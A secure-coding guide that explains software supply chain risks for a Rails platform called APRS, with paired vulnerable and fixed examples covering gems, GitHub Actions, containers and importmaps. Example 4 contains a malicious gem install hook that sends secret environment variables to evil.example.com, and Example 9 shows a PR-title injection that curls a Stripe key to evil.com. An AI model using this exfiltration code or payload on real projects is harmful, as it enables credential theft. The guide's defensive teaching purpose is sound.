# A07 — Software Supply Chain Failures

## Overview

Software Supply Chain Failures occur when an application is compromised through its dependencies, build tools, CI/CD pipelines, or distribution mechanisms rather than through vulnerabilities in the application code itself. This risk category, elevated in the OWASP 2025 Top 10 (mapped from 2021 A08 and incorporated into 2025 A03), reflects the growing sophistication of attacks targeting the software development lifecycle rather than the deployed application.

For APRS, the supply chain attack surface is substantial. The platform depends on dozens of RubyGems (Devise, Pundit, Stripe, RGeo, pg, and their transitive dependencies), a GitHub Actions CI/CD pipeline, a Chainguard Wolfi-based container image, and npm packages for frontend asset tooling. A single compromised gem, a malicious GitHub Action, or a poisoned container base image could grant an attacker access to user sighting data, Stripe payment credentials, or the PostGIS database containing sensitive observer locations.

The RubyGems ecosystem has historically been targeted by typosquatting attacks (e.g., `atlas-client` impersonating `atlas_client`), and the Bundler dependency resolution mechanism can be exploited through dependency confusion when private gem sources are mixed with rubygems.org. Additionally, CI/CD pipelines that reference GitHub Actions by mutable tags rather than immutable SHA hashes are vulnerable to tag-repointing attacks, where an attacker who compromises an action repository can inject malicious code into every downstream build.

## APRS-Specific Attack Surface

- **RubyGems ecosystem:** Typosquatted gem names targeting `devise`, `pundit`, `stripe`, `rgeo`, `pg`, and other APRS dependencies
- **Gemfile dependency resolution:** Dependency confusion when mixing private gem sources with rubygems.org; Gemfile.lock manipulation to pin known-vulnerable versions
- **Transitive dependencies:** Deep dependency trees (e.g., `devise` -> `warden` -> `rack`) where a compromise at any level propagates upstream
- **GitHub Actions marketplace:** Compromised or malicious Actions referenced by mutable tags instead of SHA-pinned commits
- **GitHub Actions cache poisoning:** Attacker-controlled cache keys injecting malicious artifacts into CI builds
- **Container base image supply chain:** Chainguard Wolfi image tag mutability; unsigned or unverified image layers
- **CI/CD pipeline integrity:** Missing branch protection rules, unsigned commits, PRs from forks executing privileged workflows
- **Pre-commit hooks and post-install scripts:** Malicious `extconf.rb` or gem post-install hooks executing arbitrary code during `bundle install`
- **bundler-audit coverage gaps:** Advisory database lag leaving zero-day vulnerabilities unreported for days or weeks
- **Asset pipeline (importmap-rails):** Compromised CDN-hosted JavaScript packages pinned by URL in `importmap.rb`

## Examples

### Basic Level

#### Example 1: Typosquatted Gem Name in Gemfile
**Source:** https://blog.rubygems.org/2022/05/25/typosquatting.html
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# Gemfile — developer accidentally types "devlse" instead of "devise"
# A malicious actor has published a typosquatted gem under this name
source "https://rubygems.org"

gem "rails", "~> 8.1.2"
gem "devlse"  # Typosquatted! Should be "devise"
gem "pundit"
gem "stripe"
```

**Secure Fix:**
```ruby
# Gemfile — always verify gem names against rubygems.org before adding
# Use exact, verified gem names and lock versions
source "https://rubygems.org"

gem "rails", "~> 8.1.2"
gem "devise", "~> 4.9"   # Verified: https://rubygems.org/gems/devise
gem "pundit", "~> 2.4"   # Verified: https://rubygems.org/gems/pundit
gem "stripe", "~> 13.0"  # Verified: https://rubygems.org/gems/stripe

# Tip: Run `bundle audit` after every Gemfile change
# Tip: Enable RubyGems MFA on all maintainer accounts
```

#### Example 2: GitHub Actions Referenced by Mutable Tag
**Source:** https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions
**Status:** [VERIFIED]

**Vulnerable Code:**
```yaml
# .github/workflows/ci.yml — actions pinned to mutable tags
# If the action repo is compromised, the tag can be repointed
# to a malicious commit
name: CI
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4          # Mutable tag!
      - uses: ruby/setup-ruby@v1           # Mutable tag!
      - uses: actions/cache@v4             # Mutable tag!
      - run: bundle exec rspec
      - run: bundle exec rubocop --parallel
```

**Secure Fix:**
```yaml
# .github/workflows/ci.yml — actions pinned to immutable SHA hashes
# Even if the action repo is compromised, builds use the audited commit
name: CI
on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # Pin to full SHA — verify at https://github.com/actions/checkout/commits
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: ruby/setup-ruby@d4526a55538b775af234ba4af27118ed6f8f6677  # v1.172.0
      - uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94d9d67  # v4.0.2
      - run: bundle exec rspec
      - run: bundle exec rubocop --parallel
```

#### Example 3: Missing Gemfile.lock in Version Control
**Source:** https://bundler.io/guides/git.html
**Status:** [VERIFIED]

**Vulnerable Code:**
```gitignore
# .gitignore — developer excludes Gemfile.lock from version control
# This means each `bundle install` may resolve to different versions,
# including newly published malicious versions of transitive dependencies
Gemfile.lock
*.lock
```

**Secure Fix:**
```gitignore
# .gitignore — NEVER ignore Gemfile.lock for applications (not libraries)
# The lock file ensures deterministic builds with exact dependency versions
# Without it, `bundle install` on CI or production could resolve to
# a compromised version of any transitive dependency

# DO NOT add Gemfile.lock here for Rails applications
# Only gem libraries should omit the lock file
```

### Intermediate Level

#### Example 4: Malicious Post-Install Hook in a Gem
**Source:** https://www.ruby-lang.org/en/news/2019/08/28/multiple-jquery-vulnerabilities-in-ruby-gems/
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# A malicious gem's extconf.rb or post_install_message
# This file executes during `bundle install` with the developer's permissions
# Attacker's gem: fake-rgeo-geojson/ext/extconf.rb
require "mkmf"
require "net/http"
require "uri"

# Exfiltrate environment variables (may contain API keys, credentials)
uri = URI("https://evil.example.com/collect")
env_data = ENV.select { |k, _| k.match?(/KEY|SECRET|TOKEN|PASSWORD/i) }
Net::HTTP.post(uri, env_data.to_json, "Content-Type" => "application/json")

# Continue with normal build to avoid suspicion
create_makefile("fake_extension")
```

**Secure Fix:**
```ruby
# Gemfile — protect against malicious post-install hooks
source "https://rubygems.org"

# 1. Only use gems from verified publishers with MFA enabled
# 2. Pin exact versions and verify checksums
gem "rgeo", "3.0.1"
gem "rgeo-geojson", "2.1.1"

# 3. In CI, use --frozen to prevent any resolution changes
# bundle install --frozen --jobs 4

# 4. Run bundle install in a sandboxed environment
# Consider using Docker/containers for builds

# 5. Use bundler-audit to check for known vulnerabilities
# bundle exec bundler-audit check --update

# 6. Review new dependencies before adding:
#    - Check gem download count on rubygems.org
#    - Review gem source code on GitHub
#    - Verify gem author identity
#    - Check for native extensions (ext/ directory)
```

#### Example 5: Dependency Confusion Attack
**Source:** https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
**Status:** [VERIFIED]

**Vulnerable Code:**
```ruby
# Gemfile — mixing private and public gem sources creates
# a dependency confusion vector. If an attacker publishes a
# higher-versioned gem on rubygems.org with the same name as
# your private gem, Bundler may prefer the public version.

source "https://rubygems.org"
source "https://gems.internal.aprs.example.com"

gem "rails", "~> 8.1.2"
gem "aprs-deconfliction-client"  # Private gem name
gem "aprs-geospatial-utils"      # Private gem name
gem "devise"
```

**Secure Fix:**
```ruby
# Gemfile — scope private gem sources to prevent confusion
# Use the :source option to bind private gems to their specific source

source "https://rubygems.org"

gem "rails", "~> 8.1.2"
gem "devise"
gem "pundit"

# Scope private gems explicitly to the private source
# Bundler will ONLY look at this source for these gems
source "https://gems.internal.aprs.example.com" do
  gem "aprs-deconfliction-client", "~> 1.0"
  gem "aprs-geospatial-utils", "~> 2.0"
end

# Alternative: use git sources for internal gems (even more explicit)
# gem "aprs-deconfliction-client", git: "https://github.com/aprs-org/deconfliction-client.git", tag: "v1.0.3"
```

#### Example 6: Container Image Tag Mutability
**Source:** https://edu.chainguard.dev/chainguard/chainguard-images/how-to-use-chainguard-images/
**Status:** [VERIFIED]

**Vulnerable Code:**
```dockerfile
# Dockerfile — using mutable :latest tag
# The content behind :latest changes with every image rebuild.
# An attacker who compromises the registry or build pipeline
# can push a malicious image under the same tag.
FROM cgr.dev/chainguard/ruby:latest AS builder

WORKDIR /app
COPY Gemfile Gemfile.lock ./
RUN bundle install --without development test

FROM cgr.dev/chainguard/ruby:latest
COPY --from=builder /app /app
CMD ["bundle", "exec", "puma"]
```

**Secure Fix:**
```dockerfile
# Dockerfile — pin to image digest for immutability
# Digest is a SHA256 hash of the image manifest; it cannot be repointed.
# Verify digest: `cosign verify cgr.dev/chainguard/ruby@sha256:abcdef...`
FROM cgr.dev/chainguard/ruby@sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2 AS builder

WORKDIR /app
COPY Gemfile Gemfile.lock ./
RUN bundle install --without development test

# Use the same pinned digest for runtime
FROM cgr.dev/chainguard/ruby@sha256:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
COPY --from=builder /app /app

# Verify image signature in CI before building:
# cosign verify --key cosign.pub cgr.dev/chainguard/ruby@sha256:...

USER nonroot
HEALTHCHECK --interval=30s --timeout=3s CMD ["ruby", "-e", "exit"]
CMD ["bundle", "exec", "puma"]
```

#### Example 7: GitHub Actions Cache Poisoning
**Source:** https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```yaml
# .github/workflows/ci.yml — cache key based on predictable values
# An attacker who can submit a PR may poison the cache for the main branch
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: ruby/setup-ruby@d4526a55538b775af234ba4af27118ed6f8f6677
        with:
          bundler-cache: true  # Caches bundle install results
      # Problem: PR workflows share cache scope with main branch
      # Attacker's PR can write a poisoned cache that main branch reads
      - run: bundle exec rspec
```

**Secure Fix:**
```yaml
# .github/workflows/ci.yml — separate cache scopes and verify integrity
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Minimal permissions
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - uses: ruby/setup-ruby@d4526a55538b775af234ba4af27118ed6f8f6677
        with:
          ruby-version: "3.4.8"
          bundler-cache: false  # Disable automatic caching

      # Manual cache with branch-scoped key
      # PR caches cannot overwrite main branch caches
      - uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94d9d67
        with:
          path: vendor/bundle
          key: ${{ runner.os }}-gems-${{ github.ref }}-${{ hashFiles('Gemfile.lock') }}
          restore-keys: |
            ${{ runner.os }}-gems-${{ github.ref }}-

      - run: bundle config set --local path vendor/bundle
      - run: bundle install --frozen --jobs 4

      # Verify bundle integrity after cache restore
      - run: bundle exec bundler-audit check --update
      - run: bundle exec rspec
```

### Advanced Level

#### Example 8: Gemfile.lock Manipulation in Pull Request
**Source:** https://bundler.io/guides/git.html
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# An attacker submits a PR that subtly modifies Gemfile.lock
# to downgrade a dependency to a known-vulnerable version or
# swap a gem's source to a malicious fork.
#
# Partial Gemfile.lock diff from a malicious PR:
#
# GIT
#   remote: https://github.com/attacker/devise.git  # <-- changed from heartcombo
#   revision: abc123malicious
#   branch: main
#   specs:
#     devise (4.9.4)
#
# The PR description says "updated dependencies" and the code
# changes look benign, but the lock file points to a fork.
```

**Secure Fix:**
```yaml
# .github/workflows/lockfile-lint.yml
# Automated check that rejects PRs modifying Gemfile.lock sources
name: Lockfile Integrity
on: pull_request

jobs:
  verify-lockfile:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
        with:
          fetch-depth: 0

      - name: Check Gemfile.lock source integrity
        run: |
          # Fail if Gemfile.lock contains any GIT sources not in allowlist
          ALLOWED_SOURCES="https://rubygems.org|https://gems.internal.aprs.example.com"

          # Extract all remote URLs from Gemfile.lock
          REMOTES=$(grep -A1 "^GIT" Gemfile.lock | grep "remote:" | awk '{print $2}' || true)

          for remote in $REMOTES; do
            if ! echo "$remote" | grep -qE "^($ALLOWED_SOURCES)"; then
              echo "SECURITY: Unauthorized gem source detected: $remote"
              echo "Only these sources are allowed: $ALLOWED_SOURCES"
              exit 1
            fi
          done

          # Verify lock file consistency
          bundle lock --verify

      - name: Audit dependencies
        run: |
          gem install bundler-audit
          bundler-audit check --update
```

```ruby
# config/initializers/bundler_integrity.rb
# Runtime verification that loaded gems match expected checksums
# This runs at boot to detect tampering between CI and deployment
Rails.application.config.after_initialize do
  if Rails.env.production?
    expected_checksums = YAML.safe_load(
      Rails.root.join("config", "gem_checksums.yml").read,
      permitted_classes: [Symbol]
    )

    Gem.loaded_specs.each do |name, spec|
      next unless expected_checksums.key?(name)

      actual_checksum = Digest::SHA256.file(spec.gem_dir + ".gem").hexdigest rescue nil
      expected = expected_checksums[name]

      if actual_checksum && actual_checksum != expected
        Rails.logger.error(
          "Gem integrity check failed",
          gem_name: name,
          expected_checksum: expected,
          actual_checksum: actual_checksum
        )
        raise "Gem integrity violation detected for #{name}" if Rails.env.production?
      end
    end
  end
end
```

#### Example 9: CI Pipeline Injection via Workflow Dispatch
**Source:** https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections
**Status:** [VERIFIED]

**Vulnerable Code:**
```yaml
# .github/workflows/deploy.yml — vulnerable to script injection
# User-controlled input (PR title) is interpolated directly into shell
name: Deploy
on:
  pull_request:
    types: [closed]

jobs:
  deploy:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Deploy notification
        run: |
          # VULNERABLE: PR title is injected directly into the shell
          # Attacker sets PR title to: test"; curl https://evil.com/steal?key=$STRIPE_SECRET_KEY #
          echo "Deploying: ${{ github.event.pull_request.title }}"
          bundle exec rails deploy:notify
        env:
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
```

**Secure Fix:**
```yaml
# .github/workflows/deploy.yml — safe from script injection
name: Deploy
on:
  pull_request:
    types: [closed]

jobs:
  deploy:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    permissions:
      contents: read
      deployments: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

      - name: Deploy notification
        # Pass user-controlled data via environment variables, not interpolation
        # Shell treats env vars as data, not executable code
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
          # Never expose secret keys to steps that don't need them
        run: |
          echo "Deploying: ${PR_TITLE}"

      - name: Run deployment
        env:
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
        run: bundle exec rails deploy:execute
        # Secrets are only available to the step that needs them
```

#### Example 10: Importmap CDN Integrity Bypass
**Source:** https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
**Status:** [UNVERIFIED]

**Vulnerable Code:**
```ruby
# config/importmap.rb — CDN-hosted JS without integrity verification
# If the CDN is compromised, malicious JS executes in user browsers
# with access to CSRF tokens, session cookies, and form data

pin "application"
pin "@hotwired/turbo-rails", to: "turbo.min.js"
pin "@hotwired/stimulus", to: "stimulus.min.js"

# Third-party library loaded from CDN without integrity hash
pin "maplibre-gl", to: "https://cdn.jsdelivr.net/npm/maplibre-gl@4.0.0/dist/maplibre-gl.js"
pin "chart.js", to: "https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.js"
```

**Secure Fix:**
```ruby
# config/importmap.rb — vendor JS locally or use integrity hashes
# Self-hosting eliminates CDN compromise as an attack vector

pin "application"
pin "@hotwired/turbo-rails", to: "turbo.min.js"
pin "@hotwired/stimulus", to: "stimulus.min.js"

# Option 1 (preferred): Vendor the JS file locally
# Download, audit, and commit to vendor/javascript/
# bin/importmap pin maplibre-gl --download
pin "maplibre-gl", to: "vendor/maplibre-gl.js"
pin "chart.js", to: "vendor/chart.umd.js"

# Option 2: If CDN is required, enforce SRI in the layout
# app/views/layouts/application.html.erb:
# <%= javascript_importmap_tags integrity: true %>
```

```ruby
# config/initializers/content_security_policy.rb
# CSP as defense-in-depth against compromised scripts
Rails.application.configure do
  config.content_security_policy do |policy|
    policy.default_src :self
    policy.script_src  :self, :strict_dynamic
    policy.style_src   :self
    policy.img_src     :self, "https://#{ENV['DO_SPACES_BUCKET']}.#{ENV['DO_SPACES_REGION']}.digitaloceanspaces.com"
    policy.connect_src :self
    policy.font_src    :self
    policy.object_src  :none
    policy.frame_src   :none
    policy.base_uri    :self
    policy.form_action :self
  end

  config.content_security_policy_nonce_generator = ->(request) { request.session.id.to_s }
  config.content_security_policy_nonce_directives = %w[script-src]
end
```

## Checklist

- [ ] All gems in Gemfile are verified against rubygems.org with correct spelling
- [ ] Gemfile.lock is committed to version control and changes are reviewed in PRs
- [ ] `bundle install --frozen` is used in CI and production to prevent resolution changes
- [ ] `bundle exec bundler-audit check --update` runs in CI on every build
- [ ] `bundle exec brakeman --no-pager` runs in CI on every build
- [ ] All GitHub Actions are pinned to full SHA commit hashes, not mutable tags
- [ ] GitHub Actions workflow permissions follow principle of least privilege (`permissions: contents: read`)
- [ ] PR workflows from forks cannot access repository secrets
- [ ] User-controlled input in GitHub Actions is passed via environment variables, never interpolated in `run:` blocks
- [ ] Container base images are pinned by digest (`@sha256:...`), not by tag
- [ ] Container images are verified with `cosign verify` before building
- [ ] Container images are scanned with `trivy` before deployment
- [ ] Private gem sources are scoped with `source "url" do ... end` blocks in Gemfile
- [ ] No `GIT` remote sources in Gemfile.lock point to unexpected repositories
- [ ] JavaScript dependencies are vendored locally or use Subresource Integrity (SRI) hashes
- [ ] CSP `script-src` does not include `unsafe-inline` or `unsafe-eval`
- [ ] Branch protection rules require signed commits on `main`
- [ ] Branch protection rules require CI to pass before merge
- [ ] Dependabot or Renovate is configured for automated dependency updates
- [ ] New gem additions require security review (check download count, maintainer MFA, native extensions)
